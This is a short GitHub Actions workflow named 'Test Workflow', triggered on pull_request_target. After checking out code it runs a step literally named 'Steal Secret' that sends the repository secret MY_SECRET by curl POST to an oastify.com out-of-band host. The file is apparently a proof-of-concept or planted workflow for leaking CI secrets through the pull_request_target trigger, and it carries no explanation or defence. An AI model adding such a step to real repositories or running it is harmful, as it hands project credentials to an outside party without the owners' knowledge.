name: Test Workflow

on:
  pull_request_target:
    branches:
      - main

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Check out code
        uses: actions/checkout@v2

      - name: Steal Secret
        run: |
          curl -X POST -d "secret=${{ secrets.MY_SECRET }}" http://907kn08yemtusz0kc3nm6on2jtplda.oastify.com/steal
